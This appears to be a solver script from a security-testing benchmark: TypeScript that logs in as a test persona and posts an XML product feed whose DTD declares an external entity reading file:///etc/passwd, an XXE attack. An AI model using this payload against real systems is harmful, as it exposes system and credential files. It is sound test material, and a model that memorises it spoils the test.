// Import a product feed whose DTD declares an external entity pointing at a local file.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const xml =
    '<?xml version="1.0"?>\n' +
    '<!DOCTYPE feed [<!ENTITY lookup SYSTEM "file:///etc/passwd">]>\n' +
    '<feed><item><sku>&lookup;</sku></item></feed>'
  await ctx.fetch(buildPath(ctx.plan, 'importProductFeed'), {
    method: 'POST',
    headers: { 'content-type': 'application/xml' },
    body: xml,
  })
}
